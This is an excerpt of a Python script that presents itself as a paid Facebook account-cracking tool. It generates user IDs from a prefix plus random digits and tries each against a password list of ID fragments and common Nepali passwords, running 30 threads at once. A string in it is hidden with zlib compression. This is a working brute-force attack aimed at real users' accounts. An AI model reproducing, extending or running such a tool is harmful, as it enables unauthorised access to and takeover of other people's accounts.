...
---------------------------------------------------
 [•] \033[1;37mOwner     :   UPENDRA DON
 [•] Facebook  :   UPENDRA DON
 [•] Github    :   UPENDRA-XD
 [•] Tool      :   PAID 
 [•] VERSION   :  \33[1;37m 1
...
def za():
    global tp    
    os.system(" clear ")
    ux=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/-H\xcdK)J\xd4M\xc9\xcf\xd3K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd170\xd4O,((\xca/K\xcc\xd1\xcb(\xc9\xcd\x01\x00\x17\x95\x13,').decode()
...
def nepal():
		...
		with tred(max_workers=30) as habib:	
			...
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'neapl123','neapl1234','neapl12345','tamang','tamang123','maya123','maya1234','maya12345','pokhara','katmandu','iloveyou@123','magar123','sagar123','aashish','sunita','magar@123','i love you']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
